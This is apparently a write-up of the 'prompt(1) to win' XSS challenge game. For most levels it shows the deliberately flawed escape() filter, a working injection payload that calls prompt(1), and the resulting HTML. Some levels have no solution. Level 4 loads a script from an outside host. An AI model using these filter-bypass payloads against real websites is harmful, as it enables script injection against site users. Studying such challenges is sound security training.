---
layout: single
title: prompt(1) to win by filedescriptor
date: 2021-05-19
classes: wide
tags:
  - prompt(1)
  - XSS
  - Challenge
  - filedescriptor
---

This is a XSS injection game inspired by alert(1) to win. Call prompt(1) to win. You should make it without user interaction.

## Challenges
- [Level 0](#level-0)
- [Level 1](#level-1)
- [Level 2](#level-2)
- [Level 3](#level-3)
- Level 4
- Level 5
- Level 6
- [Level 7](#level-7)
- Level 8
- Level 9
- [Level A](#level-a)
- [Level B](#level-b)
- [Level C](#level-c)
- Level D
- Level E
- [Level F](#level-f)

## Level 0

- Task
 
```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
} 
```

- Solution

```
"><svg onload=prompt(1)//
```

- HTML source

```
<input type="text" value=""><svg onload=prompt(1)//">
```


## Level 1

- Task

```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

- Solution

```
<svg onload=prompt(1)//
```

- HTML source

```
<article><svg onload=prompt(1)// </article>
```


## Level 2

- Task

```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}     
```

- Solution

```
<script>eval.call`${'prompt\x281\x29'}`</script>
```

HTML source

```
<script>eval.call`${'prompt\x281\x29'}`</script>
```


## Level 3

- Task

- Solution

```
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```

```
--!><svg onload=prompt(1)>
```

- HTML source

```
<!-- --!><svg onload=prompt(1)> -->
```


## Level 4

- Task 

```
 Text Viewer
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}  
```

- Solution

```
https://prompt.ml%2F@rxss.netlify.app/script.js
```

- HTML Source

```
<script src="https://prompt.ml%2F@rxss.netlify.app/script.js"></script>
```


## Level 5

- Task

```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}
```

- Solution

```
" type=image src onerror
="prompt(1)
```

- HTML Source

```
<input value="" type=image src onerror
="prompt(1)" type="text">
```

## Level 6

- Task

```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}
```


## Level 7

- Task

```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```

- Solution

```
"><script>/*#*/prompt/*#*/(1)/*#*/</script>
```

- HTML source

```
<p class="comment" title=""><script>/*"></p>
<p class="comment" title="*/prompt/*"></p>
<p class="comment" title="*/(1)/*"></p>
<p class="comment" title="*/</script>"></p>
```


## Level 8

- Task

```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
} 
```


## Level 9

- Task

```
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}
```


## Level A

- Task

```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}   
```

- Solution

```
eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)
```

- HTML source

```
<script>eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)</script>
```


## Level B

- Task

```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}    
```

- Solution

```
".concat(`${prompt(1)}`),..."
```

- HTML source

```
<script>                                    
    var data = {"action":"login","message":"Welcome back, ".concat(`${prompt(1)}`),..."."};          
    if (data.action === "login")            
        document.write(data.message)        
</script>
```


## Level C

- Task

```
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}
```

- Solution

```
eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)
```

- HTML source

```
<script>eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)</script>
```


## Level D

- Task

```
function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}
```


## Level E

- Task

```
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
}
```


## Level F

- Task

```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}
```

- Solution

```
"><script>`#${prompt(1)}#`</script>
```

- HTML source

```
<p class="comment" title=""><script>`" data-comment='{"id":0}'></p>
<p class="comment" title="${prompt(1)}" data-comment='{"id":1}'></p>
<p class="comment" title="`</script>" data-comment='{"id":2}'></p>
```